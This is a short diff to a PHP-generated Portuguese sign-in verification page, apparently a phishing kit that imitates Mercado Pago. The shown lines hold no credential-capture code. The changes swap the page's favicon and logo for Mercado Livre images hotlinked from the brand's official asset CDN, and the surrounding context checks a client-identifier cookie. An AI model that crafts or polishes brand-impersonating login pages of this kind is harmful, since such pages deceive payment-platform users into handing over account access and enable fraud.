@@ -72,7 +72,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Escolha um método de verificação para iniciar sessão</title>
-    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.73/mercadopago/favicon.svg" type="image/svg"/>
+    <link rel="icon" href="https://http2.mlstatic.com/frontend-assets/ui-navigation/6.6.5/mercadolibre/favicon.ico" type="image/svg"/>
     <style>
         :root {
             --andes-color-yellow-500: #ffe600;
@@ -118,7 +118,7 @@ if (isset($_COOKIE['identificador_cliente'])) {
 <body>
 
     <header class="main-header">
-        <img src="https://http2.mlstatic.com/frontend-assets/mp-web-navigation/ui-navigation/6.7.72/mercadopago/logo__small.png" alt="Mercado Pago">
+        <img src="https://http2.mlstatic.com/frontend-assets/ml-web-navigation/ui-navigation/6.6.5/mercadolibre/pt_logo_large_plus.webp" alt="Mercado Pago">
     </header>
 
     <main class="main-content">
